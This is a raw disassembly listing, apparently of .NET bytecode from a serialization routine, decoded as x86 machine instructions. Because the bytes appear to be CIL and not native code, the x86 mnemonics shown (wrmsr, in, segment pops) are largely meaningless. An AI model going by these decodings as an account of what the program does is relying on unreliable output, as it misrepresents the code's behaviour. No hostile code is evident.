  402ba8:	29 00                	sub    %eax,(%eax)
  402baa:	00 00                	add    %al,(%eax)
  402bac:	07                   	pop    %es
  402bad:	00 00                	add    %al,(%eax)
  402baf:	11 02                	adc    %eax,(%edx)
  402bb1:	8e 69 8d             	mov    -0x73(%ecx),%gs
  402bb4:	57                   	push   %edi
  402bb5:	00 00                	add    %al,(%eax)
  402bb7:	01 0a                	add    %ecx,(%edx)
  402bb9:	02 8e 69 17 59 0b    	add    0xb591769(%esi),%cl
  402bbf:	16                   	push   %ss
  402bc0:	0c 2b                	or     $0x2b,%al
  402bc2:	0e                   	push   %cs
  402bc3:	06                   	push   %es
  402bc4:	08 02                	or     %al,(%edx)
  402bc6:	07                   	pop    %es
  402bc7:	91                   	xchg   %eax,%ecx
  402bc8:	9c                   	pushf
  402bc9:	07                   	pop    %es
  402bca:	17                   	pop    %ss
  402bcb:	59                   	pop    %ecx
  402bcc:	0b 08                	or     (%eax),%ecx
  402bce:	17                   	pop    %ss
  402bcf:	58                   	pop    %eax
  402bd0:	0c 08                	or     $0x8,%al
  402bd2:	06                   	push   %es
  402bd3:	8e 69 32             	mov    0x32(%ecx),%gs
  402bd6:	ec                   	in     (%dx),%al
  402bd7:	06                   	push   %es
  402bd8:	2a 32                	sub    (%edx),%dh
  402bda:	02 28                	add    (%eax),%ch
  402bdc:	56                   	push   %esi
  402bdd:	00 00                	add    %al,(%eax)
  402bdf:	0a 28                	or     (%eax),%ch
  402be1:	26 00 00             	add    %al,%es:(%eax)
  402be4:	06                   	push   %es
  402be5:	2a 8e 1a 8d 57 00    	sub    0x578d1a(%esi),%cl
  402beb:	00 01                	add    %al,(%ecx)
  402bed:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  402bf2:	25 18 02 1e 63       	and    $0x631e0218,%eax
  402bf7:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  402bfe:	63 d2                	arpl   %edx,%edx
  402c00:	9c                   	pushf
  402c01:	25 16 02 1f 18       	and    $0x181f0216,%eax
  402c06:	63 d2                	arpl   %edx,%edx
  402c08:	9c                   	pushf
  402c09:	2a 4e 18             	sub    0x18(%esi),%cl
  402c0c:	8d 57 00             	lea    0x0(%edi),%edx
  402c0f:	00 01                	add    %al,(%ecx)
  402c11:	25 17 02 d2 9c       	and    $0x9cd20217,%eax
  402c16:	25 16 02 1e 63       	and    $0x631e0216,%eax
  402c1b:	d2 9c 2a 32 02 28 57 	rcrb   %cl,0x57280232(%edx,%ebp,1)
  402c22:	00 00                	add    %al,(%eax)
  402c24:	0a 28                	or     (%eax),%ch
  402c26:	26 00 00             	add    %al,%es:(%eax)
  402c29:	06                   	push   %es
  402c2a:	2a 1e                	sub    (%esi),%bl
  402c2c:	02 28                	add    (%eax),%ch
  402c2e:	1a 00                	sbb    (%eax),%al
  402c30:	00 0a                	add    %cl,(%edx)
  402c32:	2a 2e                	sub    (%esi),%ch
  402c34:	73 58                	jae    0x402c8e
  402c36:	00 00                	add    %al,(%eax)
  402c38:	0a 80 1c 00 00 04    	or     0x400001c(%eax),%al
  402c3e:	2a 56 02             	sub    0x2(%esi),%dl
  402c41:	15 7d 1e 00 00       	adc    $0x1e7d,%eax
  402c46:	04 02                	add    $0x2,%al
  402c48:	28 1a                	sub    %bl,(%edx)
  402c4a:	00 00                	add    %al,(%eax)
  402c4c:	0a 02                	or     (%edx),%al
  402c4e:	03 7d 1d             	add    0x1d(%ebp),%edi
  402c51:	00 00                	add    %al,(%eax)
  402c53:	04 2a                	add    $0x2a,%al
  402c55:	4a                   	dec    %edx
  402c56:	02 7b 1d             	add    0x1d(%ebx),%bh
  402c59:	00 00                	add    %al,(%eax)
  402c5b:	04 02                	add    $0x2,%al
  402c5d:	7b 1e                	jnp    0x402c7d
  402c5f:	00 00                	add    %al,(%eax)
  402c61:	04 6f                	add    $0x6f,%al
  402c63:	59                   	pop    %ecx
  402c64:	00 00                	add    %al,(%eax)
  402c66:	0a 2a                	or     (%edx),%ch
  402c68:	8a 02                	mov    (%edx),%al
  402c6a:	02 7b 1e             	add    0x1e(%ebx),%bh
  402c6d:	00 00                	add    %al,(%eax)
  402c6f:	04 17                	add    $0x17,%al
  402c71:	58                   	pop    %eax
  402c72:	7d 1e                	jge    0x402c92
  402c74:	00 00                	add    %al,(%eax)
  402c76:	04 02                	add    $0x2,%al
  402c78:	7b 1e                	jnp    0x402c98
  402c7a:	00 00                	add    %al,(%eax)
  402c7c:	04 02                	add    $0x2,%al
  402c7e:	7b 1d                	jnp    0x402c9d
  402c80:	00 00                	add    %al,(%eax)
  402c82:	04 6f                	add    $0x6f,%al
  402c84:	5a                   	pop    %edx
  402c85:	00 00                	add    %al,(%eax)
  402c87:	0a fe                	or     %dh,%bh
  402c89:	04 2a                	add    $0x2a,%al
  402c8b:	22 02                	and    (%edx),%al
  402c8d:	15 7d 1e 00 00       	adc    $0x1e7d,%eax
  402c92:	04 2a                	add    $0x2a,%al
  402c94:	56                   	push   %esi
  402c95:	02 28                	add    (%eax),%ch
  402c97:	1a 00                	sbb    (%eax),%al
  402c99:	00 0a                	add    %cl,(%edx)
  402c9b:	02 03                	add    (%ebx),%al
  402c9d:	7d 20                	jge    0x402cbf
  402c9f:	00 00                	add    %al,(%eax)
  402ca1:	04 02                	add    $0x2,%al
  402ca3:	04 7d                	add    $0x7d,%al
  402ca5:	1f                   	pop    %ds
  402ca6:	00 00                	add    %al,(%eax)
  402ca8:	04 2a                	add    $0x2a,%al
  402caa:	32 02                	xor    (%edx),%al
  402cac:	7b 20                	jnp    0x402cce
  402cae:	00 00                	add    %al,(%eax)
  402cb0:	04 6f                	add    $0x6f,%al
  402cb2:	3f                   	aas
  402cb3:	00 00                	add    %al,(%eax)
  402cb5:	06                   	push   %es
  402cb6:	2a 4e 02             	sub    0x2(%esi),%cl
  402cb9:	7b 20                	jnp    0x402cdb
  402cbb:	00 00                	add    %al,(%eax)
  402cbd:	04 6f                	add    $0x6f,%al
  402cbf:	3f                   	aas
  402cc0:	00 00                	add    %al,(%eax)
  402cc2:	06                   	push   %es
  402cc3:	25 03 6f 5a 00       	and    $0x5a6f03,%eax
  402cc8:	00 06                	add    %al,(%esi)
  402cca:	2a 4e 02             	sub    0x2(%esi),%cl
  402ccd:	7b 20                	jnp    0x402cef
  402ccf:	00 00                	add    %al,(%eax)
  402cd1:	04 6f                	add    $0x6f,%al
  402cd3:	3f                   	aas
  402cd4:	00 00                	add    %al,(%eax)
  402cd6:	06                   	push   %es
  402cd7:	25 03 6f 42 00       	and    $0x426f03,%eax
  402cdc:	00 06                	add    %al,(%esi)
  402cde:	2a 4e 02             	sub    0x2(%esi),%cl
  402ce1:	7b 20                	jnp    0x402d03
  402ce3:	00 00                	add    %al,(%eax)
  402ce5:	04 6f                	add    $0x6f,%al
  402ce7:	3f                   	aas
  402ce8:	00 00                	add    %al,(%eax)
  402cea:	06                   	push   %es
  402ceb:	25 03 6f 53 00       	and    $0x536f03,%eax
  402cf0:	00 06                	add    %al,(%esi)
  402cf2:	2a 36                	sub    (%esi),%dh
  402cf4:	02 7b 1f             	add    0x1f(%ebx),%bh
  402cf7:	00 00                	add    %al,(%eax)
  402cf9:	04 03                	add    $0x3,%al
  402cfb:	6f                   	outsl  %ds:(%esi),(%dx)
  402cfc:	59                   	pop    %ecx
  402cfd:	00 00                	add    %al,(%eax)
  402cff:	0a 2a                	or     (%edx),%ch
  402d01:	32 02                	xor    (%edx),%al
  402d03:	7b 1f                	jnp    0x402d24
  402d05:	00 00                	add    %al,(%eax)
  402d07:	04 6f                	add    $0x6f,%al
  402d09:	5a                   	pop    %edx
  402d0a:	00 00                	add    %al,(%eax)
  402d0c:	0a 2a                	or     (%edx),%ch
  402d0e:	66 02 03             	data16 add (%ebx),%al
  402d11:	7d 21                	jge    0x402d34
  402d13:	00 00                	add    %al,(%eax)
  402d15:	04 02                	add    $0x2,%al
  402d17:	02 7b 21             	add    0x21(%ebx),%bh
  402d1a:	00 00                	add    %al,(%eax)
  402d1c:	04 6f                	add    $0x6f,%al
  402d1e:	5b                   	pop    %ebx
  402d1f:	00 00                	add    %al,(%eax)
  402d21:	0a 7d 22             	or     0x22(%ebp),%bh
  402d24:	00 00                	add    %al,(%eax)
  402d26:	04 2a                	add    $0x2a,%al
  402d28:	13 30                	adc    (%eax),%esi
  402d2a:	02 00                	add    (%eax),%al
  402d2c:	33 00                	xor    (%eax),%eax
  402d2e:	00 00                	add    %al,(%eax)
  402d30:	01 00                	add    %eax,(%eax)
  402d32:	00 11                	add    %dl,(%ecx)
  402d34:	16                   	push   %ss
  402d35:	0a 2b                	or     (%ebx),%ch
  402d37:	15 02 7b 26 00       	adc    $0x267b02,%eax
  402d3c:	00 04 06             	add    %al,(%esi,%eax,1)
  402d3f:	6f                   	outsl  %ds:(%esi),(%dx)
  402d40:	59                   	pop    %ecx
  402d41:	00 00                	add    %al,(%eax)
  402d43:	0a 6f 39             	or     0x39(%edi),%ch
  402d46:	00 00                	add    %al,(%eax)
  402d48:	06                   	push   %es
  402d49:	06                   	push   %es
  402d4a:	17                   	pop    %ss
  402d4b:	58                   	pop    %eax
  402d4c:	0a 06                	or     (%esi),%al
  402d4e:	02 7b 26             	add    0x26(%ebx),%bh
  402d51:	00 00                	add    %al,(%eax)
  402d53:	04 6f                	add    $0x6f,%al
  402d55:	5a                   	pop    %edx
  402d56:	00 00                	add    %al,(%eax)
  402d58:	0a 32                	or     (%edx),%dh
  402d5a:	dd 02                	fldl   (%edx)
  402d5c:	7b 26                	jnp    0x402d84
  402d5e:	00 00                	add    %al,(%eax)
  402d60:	04 6f                	add    $0x6f,%al
  402d62:	5c                   	pop    %esp
  402d63:	00 00                	add    %al,(%eax)
  402d65:	0a 2a                	or     (%edx),%ch
  402d67:	00 13                	add    %dl,(%ebx)
  402d69:	30 02                	xor    %al,(%edx)
  402d6b:	00 1b                	add    %bl,(%ebx)
  402d6d:	00 00                	add    %al,(%eax)
  402d6f:	00 08                	add    %cl,(%eax)
  402d71:	00 00                	add    %al,(%eax)
  402d73:	11 73 62             	adc    %esi,0x62(%ebx)
  402d76:	00 00                	add    %al,(%eax)
  402d78:	06                   	push   %es
  402d79:	0a 06                	or     (%esi),%al
  402d7b:	02 7d 25             	add    0x25(%ebp),%bh
  402d7e:	00 00                	add    %al,(%eax)
  402d80:	04 02                	add    $0x2,%al
  402d82:	7b 26                	jnp    0x402daa
  402d84:	00 00                	add    %al,(%eax)
  402d86:	04 06                	add    $0x6,%al
  402d88:	6f                   	outsl  %ds:(%esi),(%dx)
  402d89:	5d                   	pop    %ebp
  402d8a:	00 00                	add    %al,(%eax)
  402d8c:	0a 06                	or     (%esi),%al
  402d8e:	2a 00                	sub    (%eax),%al
  402d90:	1b 30                	sbb    (%eax),%esi
  402d92:	02 00                	add    (%eax),%al
  402d94:	54                   	push   %esp
  402d95:	00 00                	add    %al,(%eax)
  402d97:	00 09                	add    %cl,(%ecx)
  402d99:	00 00                	add    %al,(%eax)
  402d9b:	11 15 0a 15 0b 03    	adc    %edx,0x30b150a
  402da1:	6f                   	outsl  %ds:(%esi),(%dx)
  402da2:	5b                   	pop    %ebx
  402da3:	00 00                	add    %al,(%eax)
  402da5:	0a 0c 02             	or     (%edx,%eax,1),%cl
  402da8:	7b 26                	jnp    0x402dd0
  402daa:	00 00                	add    %al,(%eax)
  402dac:	04 6f                	add    $0x6f,%al
  402dae:	5e                   	pop    %esi
  402daf:	00 00                	add    %al,(%eax)
  402db1:	0a 0d 2b 20 12 03    	or     0x312202b,%cl
  402db7:	28 5f 00             	sub    %bl,0x0(%edi)
  402dba:	00 0a                	add    %cl,(%edx)
  402dbc:	13 04 06             	adc    (%esi,%eax,1),%eax
  402dbf:	17                   	pop    %ss
  402dc0:	58                   	pop    %eax
  402dc1:	0a 08                	or     (%eax),%cl
  402dc3:	11 04 7b             	adc    %eax,(%ebx,%edi,2)
  402dc6:	22 00                	and    (%eax),%al
  402dc8:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402dcb:	60                   	pusha
  402dcc:	00 00                	add    %al,(%eax)
  402dce:	0a 2c 04             	or     (%esp,%eax,1),%ch
  402dd1:	06                   	push   %es
  402dd2:	0b de                	or     %esi,%ebx
  402dd4:	19 12                	sbb    %edx,(%edx)
  402dd6:	03 28                	add    (%eax),%ebp
  402dd8:	61                   	popa
  402dd9:	00 00                	add    %al,(%eax)
  402ddb:	0a 2d d7 de 0e 12    	or     0x120eded7,%ch
  402de1:	03 fe                	add    %esi,%edi
  402de3:	16                   	push   %ss
  402de4:	02 00                	add    (%eax),%al
  402de6:	00 1b                	add    %bl,(%ebx)
  402de8:	6f                   	outsl  %ds:(%esi),(%dx)
  402de9:	33 00                	xor    (%eax),%eax
  402deb:	00 0a                	add    %cl,(%edx)
  402ded:	dc 07                	faddl  (%edi)
  402def:	2a 01                	sub    (%ecx),%al
  402df1:	10 00                	adc    %al,(%eax)
  402df3:	00 02                	add    %al,(%edx)
  402df5:	00 17                	add    %dl,(%edi)
  402df7:	00 2d 44 00 0e 00    	add    %ch,0xe0044
  402dfd:	00 00                	add    %al,(%eax)
  402dff:	00 13                	add    %dl,(%ebx)
  402e01:	30 02                	xor    %al,(%edx)
  402e03:	00 1b                	add    %bl,(%ebx)
  402e05:	00 00                	add    %al,(%eax)
  402e07:	00 01                	add    %al,(%ecx)
  402e09:	00 00                	add    %al,(%eax)
  402e0b:	11 02                	adc    %eax,(%edx)
  402e0d:	03 28                	add    (%eax),%ebp
  402e0f:	3b 00                	cmp    (%eax),%eax
  402e11:	00 06                	add    %al,(%esi)
  402e13:	0a 06                	or     (%esi),%al
  402e15:	15 33 02 14 2a       	adc    $0x2a140233,%eax
  402e1a:	02 7b 26             	add    0x26(%ebx),%bh
  402e1d:	00 00                	add    %al,(%eax)
  402e1f:	04 06                	add    $0x6,%al
  402e21:	6f                   	outsl  %ds:(%esi),(%dx)
  402e22:	59                   	pop    %ecx
  402e23:	00 00                	add    %al,(%eax)
  402e25:	0a 2a                	or     (%edx),%ch
  402e27:	76 02                	jbe    0x402e2b
  402e29:	7b 24                	jnp    0x402e4f
  402e2b:	00 00                	add    %al,(%eax)
  402e2d:	04 18                	add    $0x18,%al
  402e2f:	2e 0d 02 28 39 00    	cs or  $0x392802,%eax
  402e35:	00 06                	add    %al,(%esi)
  402e37:	02 18                	add    (%eax),%bl
  402e39:	7d 24                	jge    0x402e5f
  402e3b:	00 00                	add    %al,(%eax)
  402e3d:	04 02                	add    $0x2,%al
  402e3f:	28 3a                	sub    %bh,(%edx)
  402e41:	00 00                	add    %al,(%eax)
  402e43:	06                   	push   %es
  402e44:	2a 76 02             	sub    0x2(%esi),%dh
  402e47:	7b 24                	jnp    0x402e6d
  402e49:	00 00                	add    %al,(%eax)
  402e4b:	04 19                	add    $0x19,%al
  402e4d:	2e 0d 02 28 39 00    	cs or  $0x392802,%eax
  402e53:	00 06                	add    %al,(%esi)
  402e55:	02 19                	add    (%ecx),%bl
  402e57:	7d 24                	jge    0x402e7d
  402e59:	00 00                	add    %al,(%eax)
  402e5b:	04 02                	add    $0x2,%al
  402e5d:	28 3a                	sub    %bh,(%edx)
  402e5f:	00 00                	add    %al,(%eax)
  402e61:	06                   	push   %es
  402e62:	2a 1e                	sub    (%esi),%bl
  402e64:	02 28                	add    (%eax),%ch
  402e66:	3e 00 00             	add    %al,%ds:(%eax)
  402e69:	06                   	push   %es
  402e6a:	2a 00                	sub    (%eax),%al
  402e6c:	13 30                	adc    (%eax),%esi
  402e6e:	04 00                	add    $0x0,%al
  402e70:	ad                   	lods   %ds:(%esi),%eax
  402e71:	00 00                	add    %al,(%eax)
  402e73:	00 0a                	add    %cl,(%edx)
  402e75:	00 00                	add    %al,(%eax)
  402e77:	11 02                	adc    %eax,(%edx)
  402e79:	7b 26                	jnp    0x402ea1
  402e7b:	00 00                	add    %al,(%eax)
  402e7d:	04 6f                	add    $0x6f,%al
  402e7f:	5a                   	pop    %edx
  402e80:	00 00                	add    %al,(%eax)
  402e82:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402e85:	1f                   	pop    %ds
  402e86:	0f 30                	wrmsr
  402e88:	13 20                	adc    (%eax),%esp
  402e8a:	80 00 00             	addb   $0x0,(%eax)
  402e8d:	00 08                	add    %cl,(%eax)
  402e8f:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  402e92:	0a 03                	or     (%ebx),%al
  402e94:	06                   	push   %es
  402e95:	6f                   	outsl  %ds:(%esi),(%dx)
  402e96:	62 00                	bound  %eax,(%eax)
  402e98:	00 0a                	add    %cl,(%edx)
  402e9a:	2b 53 08             	sub    0x8(%ebx),%edx
  402e9d:	20 ff                	and    %bh,%bh
  402e9f:	ff 00                	incl   (%eax)
  402ea1:	00 30                	add    %dh,(%eax)
  402ea3:	27                   	daa
  402ea4:	20 de                	and    %bl,%dh
  402ea6:	00 00                	add    %al,(%eax)
  402ea8:	00 0a                	add    %cl,(%edx)
  402eaa:	03 06                	add    (%esi),%eax
  402eac:	6f                   	outsl  %ds:(%esi),(%dx)
  402ead:	62 00                	bound  %eax,(%eax)
  402eaf:	00 0a                	add    %cl,(%edx)
  402eb1:	08 68 28             	or     %ch,0x28(%eax)
  402eb4:	63 00                	arpl   %eax,(%eax)
  402eb6:	00 0a                	add    %cl,(%edx)
  402eb8:	28 26                	sub    %ah,(%esi)
  402eba:	00 00                	add    %al,(%eax)
  402ebc:	06                   	push   %es
  402ebd:	0b 03                	or     (%ebx),%eax
  402ebf:	07                   	pop    %es
  402ec0:	16                   	push   %ss
  402ec1:	07                   	pop    %es
  402ec2:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402ec5:	4c                   	dec    %esp
  402ec6:	00 00                	add    %al,(%eax)
  402ec8:	0a 2b                	or     (%ebx),%ch
  402eca:	24 20                	and    $0x20,%al
  402ecc:	df 00                	filds  (%eax)
  402ece:	00 00                	add    %al,(%eax)
  402ed0:	0a 03                	or     (%ebx),%al
  402ed2:	06                   	push   %es
  402ed3:	6f                   	outsl  %ds:(%esi),(%dx)
  402ed4:	62 00                	bound  %eax,(%eax)
  402ed6:	00 0a                	add    %cl,(%edx)
  402ed8:	08 28                	or     %ch,(%eax)
  402eda:	4a                   	dec    %edx
  402edb:	00 00                	add    %al,(%eax)
  402edd:	0a 28                	or     (%eax),%ch
  402edf:	26 00 00             	add    %al,%es:(%eax)
  402ee2:	06                   	push   %es
  402ee3:	0b 03                	or     (%ebx),%eax
  402ee5:	07                   	pop    %es
  402ee6:	16                   	push   %ss
  402ee7:	07                   	pop    %es
  402ee8:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402eeb:	4c                   	dec    %esp
  402eec:	00 00                	add    %al,(%eax)
  402eee:	0a 16                	or     (%esi),%dl
  402ef0:	0d 2b 2d 03 02       	or     $0x2032d2b,%eax
  402ef5:	7b 26                	jnp    0x402f1d
  402ef7:	00 00                	add    %al,(%eax)
  402ef9:	04 09                	add    $0x9,%al
  402efb:	6f                   	outsl  %ds:(%esi),(%dx)
  402efc:	59                   	pop    %ecx
  402efd:	00 00                	add    %al,(%eax)
  402eff:	0a 7b 21             	or     0x21(%ebx),%bh
  402f02:	00 00                	add    %al,(%eax)
  402f04:	04 28                	add    $0x28,%al
  402f06:	68 00 00 06 02       	push   $0x2060000
  402f0b:	7b 26                	jnp    0x402f33
  402f0d:	00 00                	add    %al,(%eax)
  402f0f:	04 09                	add    $0x9,%al
  402f11:	6f                   	outsl  %ds:(%esi),(%dx)
  402f12:	59                   	pop    %ecx
  402f13:	00 00                	add    %al,(%eax)
  402f15:	0a 03                	or     (%ebx),%al
  402f17:	6f                   	outsl  %ds:(%esi),(%dx)
  402f18:	58                   	pop    %eax
  402f19:	00 00                	add    %al,(%eax)
  402f1b:	06                   	push   %es
  402f1c:	09 17                	or     %edx,(%edi)
  402f1e:	58                   	pop    %eax
  402f1f:	0d 09 08 32 cf       	or     $0xcf320809,%eax
  402f24:	2a 00                	sub    (%eax),%al
  402f26:	00 00                	add    %al,(%eax)
  402f28:	13 30                	adc    (%eax),%esi
  402f2a:	04 00                	add    $0x0,%al
  402f2c:	96                   	xchg   %eax,%esi
  402f2d:	00 00                	add    %al,(%eax)
  402f2f:	00 0a                	add    %cl,(%edx)
  402f31:	00 00                	add    %al,(%eax)
  402f33:	11 02                	adc    %eax,(%edx)
  402f35:	7b 26                	jnp    0x402f5d
  402f37:	00 00                	add    %al,(%eax)
  402f39:	04 6f                	add    $0x6f,%al
  402f3b:	5a                   	pop    %edx
  402f3c:	00 00                	add    %al,(%eax)
  402f3e:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402f41:	1f                   	pop    %ds
  402f42:	0f 30                	wrmsr
  402f44:	13 20                	adc    (%eax),%esp
  402f46:	90                   	nop
  402f47:	00 00                	add    %al,(%eax)
  402f49:	00 08                	add    %cl,(%eax)
  402f4b:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  402f4e:	0a 03                	or     (%ebx),%al
  402f50:	06                   	push   %es
  402f51:	6f                   	outsl  %ds:(%esi),(%dx)
  402f52:	62 00                	bound  %eax,(%eax)
  402f54:	00 0a                	add    %cl,(%edx)
  402f56:	2b 53 08             	sub    0x8(%ebx),%edx
  402f59:	20 ff                	and    %bh,%bh
  402f5b:	ff 00                	incl   (%eax)
  402f5d:	00 30                	add    %dh,(%eax)
  402f5f:	27                   	daa
  402f60:	20 dc                	and    %bl,%ah
  402f62:	00 00                	add    %al,(%eax)
  402f64:	00 0a                	add    %cl,(%edx)
  402f66:	03 06                	add    (%esi),%eax
  402f68:	6f                   	outsl  %ds:(%esi),(%dx)
  402f69:	62 00                	bound  %eax,(%eax)
  402f6b:	00 0a                	add    %cl,(%edx)
  402f6d:	08 68 28             	or     %ch,0x28(%eax)
  402f70:	63 00                	arpl   %eax,(%eax)
  402f72:	00 0a                	add    %cl,(%edx)
  402f74:	28 26                	sub    %ah,(%esi)
  402f76:	00 00                	add    %al,(%eax)
  402f78:	06                   	push   %es
  402f79:	0b 03                	or     (%ebx),%eax
  402f7b:	07                   	pop    %es
  402f7c:	16                   	push   %ss
  402f7d:	07                   	pop    %es
  402f7e:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402f81:	4c                   	dec    %esp
  402f82:	00 00                	add    %al,(%eax)
  402f84:	0a 2b                	or     (%ebx),%ch
  402f86:	24 20                	and    $0x20,%al
  402f88:	dd 00                	fldl   (%eax)
  402f8a:	00 00                	add    %al,(%eax)
  402f8c:	0a 03                	or     (%ebx),%al
  402f8e:	06                   	push   %es
  402f8f:	6f                   	outsl  %ds:(%esi),(%dx)
  402f90:	62 00                	bound  %eax,(%eax)
  402f92:	00 0a                	add    %cl,(%edx)
  402f94:	08 28                	or     %ch,(%eax)
  402f96:	4a                   	dec    %edx
  402f97:	00 00                	add    %al,(%eax)
  402f99:	0a 28                	or     (%eax),%ch
  402f9b:	26 00 00             	add    %al,%es:(%eax)
  402f9e:	06                   	push   %es
  402f9f:	0b 03                	or     (%ebx),%eax
  402fa1:	07                   	pop    %es
  402fa2:	16                   	push   %ss
  402fa3:	07                   	pop    %es
  402fa4:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402fa7:	4c                   	dec    %esp
  402fa8:	00 00                	add    %al,(%eax)
  402faa:	0a 16                	or     (%esi),%dl
  402fac:	0d 2b 16 02 7b       	or     $0x7b02162b,%eax
  402fb1:	26 00 00             	add    %al,%es:(%eax)
  402fb4:	04 09                	add    $0x9,%al
  402fb6:	6f                   	outsl  %ds:(%esi),(%dx)
  402fb7:	59                   	pop    %ecx
  402fb8:	00 00                	add    %al,(%eax)
  402fba:	0a 03                	or     (%ebx),%al
  402fbc:	6f                   	outsl  %ds:(%esi),(%dx)
  402fbd:	58                   	pop    %eax
  402fbe:	00 00                	add    %al,(%eax)
  402fc0:	06                   	push   %es
  402fc1:	09 17                	or     %edx,(%edi)
  402fc3:	58                   	pop    %eax
  402fc4:	0d 09 08 32 e6       	or     $0xe6320809,%eax
  402fc9:	2a 52 02             	sub    0x2(%edx),%dl
  402fcc:	03 8c 61 00 00 01 7d 	add    0x7d010000(%ecx,%eiz,2),%ecx
  402fd3:	23 00                	and    (%eax),%eax
  402fd5:	00 04 02             	add    %al,(%edx,%eax,1)
  402fd8:	1b 7d 24             	sbb    0x24(%ebp),%edi
  402fdb:	00 00                	add    %al,(%eax)
  402fdd:	04 2a                	add    $0x2a,%al
  402fdf:	52                   	push   %edx
  402fe0:	02 03                	add    (%ebx),%al
  402fe2:	8c 62 00             	mov    %fs,0x0(%edx)
  402fe5:	00 01                	add    %al,(%ecx)
  402fe7:	7d 23                	jge    0x40300c
  402fe9:	00 00                	add    %al,(%eax)
  402feb:	04 02                	add    $0x2,%al
  402fed:	1c 7d                	sbb    $0x7d,%al
  402fef:	24 00                	and    $0x0,%al
  402ff1:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402ff4:	13 30                	adc    (%eax),%esi
  402ff6:	02 00                	add    (%eax),%al
  402ff8:	96                   	xchg   %eax,%esi
  402ff9:	00 00                	add    %al,(%eax)
  402ffb:	00 0b                	add    %cl,(%ebx)
  402ffd:	00 00                	add    %al,(%eax)
  402fff:	11 02                	adc    %eax,(%edx)
  403001:	7b 24                	jnp    0x403027
  403003:	00 00                	add    %al,(%eax)
  403005:	04 0a                	add    $0xa,%al
  403007:	06                   	push   %es
  403008:	1a 59 45             	sbb    0x45(%ecx),%bl
  40300b:	07                   	pop    %es
  40300c:	00 00                	add    %al,(%eax)
  40300e:	00 1f                	add    %bl,(%edi)
  403010:	00 00                	add    %al,(%eax)
  403012:	00 02                	add    %al,(%edx)
  403014:	00 00                	add    %al,(%eax)
  403016:	00 13                	add    %dl,(%ebx)
  403018:	00 00                	add    %al,(%eax)
  40301a:	00 68 00             	add    %ch,0x0(%eax)
  40301d:	00 00                	add    %al,(%eax)
  40301f:	35 00 00 00 46       	xor    $0x46000000,%eax
  403024:	00 00                	add    %al,(%eax)
  403026:	00 57 00             	add    %dl,0x0(%edi)
  403029:	00 00                	add    %al,(%eax)
  40302b:	2b 66 02             	sub    0x2(%esi),%esp
  40302e:	7b 23                	jnp    0x403053
  403030:	00 00                	add    %al,(%eax)
  403032:	04 a5                	add    $0xa5,%al
  403034:	61                   	popa
  403035:	00 00                	add    %al,(%eax)
  403037:	01 28                	add    %ebp,(%eax)
  403039:	64 00 00             	add    %al,%fs:(%eax)
  40303c:	0a 2a                	or     (%edx),%ch
  40303e:	02 7b 23             	add    0x23(%ebx),%bh
  403041:	00 00                	add    %al,(%eax)
  403043:	04 a5                	add    $0xa5,%al
  403045:	62 00                	bound  %eax,(%eax)
  403047:	00 01                	add    %al,(%ecx)
  403049:	2a 02                	sub    (%edx),%al
  40304b:	7b 23                	jnp    0x403070
  40304d:	00 00                	add    %al,(%eax)
  40304f:	04 6f                	add    $0x6f,%al
  403051:	38 00                	cmp    %al,(%eax)
  403053:	00 0a                	add    %cl,(%edx)
  403055:	6f                   	outsl  %ds:(%esi),(%dx)
  403056:	65 00 00             	add    %al,%gs:(%eax)
  403059:	0a 28                	or     (%eax),%ch
  40305b:	66 00 00             	data16 add %al,(%eax)
  40305e:	0a 2a                	or     (%edx),%ch
  403060:	02 7b 23             	add    0x23(%ebx),%bh
  403063:	00 00                	add    %al,(%eax)
  403065:	04 a5                	add    $0xa5,%al
  403067:	63 00                	arpl   %eax,(%eax)
  403069:	00 01                	add    %al,(%ecx)
  40306b:	28 67 00             	sub    %ah,0x0(%edi)
  40306e:	00 0a                	add    %cl,(%edx)
  403070:	2a 02                	sub    (%edx),%al
  403072:	7b 23                	jnp    0x403097
  403074:	00 00                	add    %al,(%eax)
  403076:	04 a5                	add    $0xa5,%al
  403078:	64 00 00             	add    %al,%fs:(%eax)
  40307b:	01 28                	add    %ebp,(%eax)
  40307d:	68 00 00 0a 2a       	push   $0x2a0a0000
  403082:	02 7b 23             	add    0x23(%ebx),%bh
  403085:	00 00                	add    %al,(%eax)
  403087:	04 a5                	add    $0xa5,%al
  403089:	26 00 00             	add    %al,%es:(%eax)
  40308c:	01 28                	add    %ebp,(%eax)
  40308e:	69 00 00 0a 2a 16    	imul   $0x162a0a00,(%eax),%eax
  403094:	6a 2a                	push   $0x2a
  403096:	00 00                	add    %al,(%eax)
  403098:	13 30                	adc    (%eax),%esi
  40309a:	02 00                	add    (%eax),%al
  40309c:	96                   	xchg   %eax,%esi
  40309d:	00 00                	add    %al,(%eax)
  40309f:	00 0b                	add    %cl,(%ebx)
  4030a1:	00 00                	add    %al,(%eax)
  4030a3:	11 02                	adc    %eax,(%edx)
  4030a5:	7b 24                	jnp    0x4030cb
  4030a7:	00 00                	add    %al,(%eax)
  4030a9:	04 0a                	add    $0xa,%al
  4030ab:	06                   	push   %es
  4030ac:	1a 59 45             	sbb    0x45(%ecx),%bl
  4030af:	07                   	pop    %es
  4030b0:	00 00                	add    %al,(%eax)
  4030b2:	00 1f                	add    %bl,(%edi)
  4030b4:	00 00                	add    %al,(%eax)
  4030b6:	00 02                	add    %al,(%edx)
  4030b8:	00 00                	add    %al,(%eax)
  4030ba:	00 0e                	add    %cl,(%esi)
  4030bc:	00 00                	add    %al,(%eax)
  4030be:	00 68 00             	add    %ch,0x0(%eax)
  4030c1:	00 00                	add    %al,(%eax)
  4030c3:	35 00 00 00 46       	xor    $0x46000000,%eax
  4030c8:	00 00                	add    %al,(%eax)
  4030ca:	00 57 00             	add    %dl,0x0(%edi)
  4030cd:	00 00                	add    %al,(%eax)
  4030cf:	2b 66 02             	sub    0x2(%esi),%esp
  4030d2:	7b 23                	jnp    0x4030f7
  4030d4:	00 00                	add    %al,(%eax)
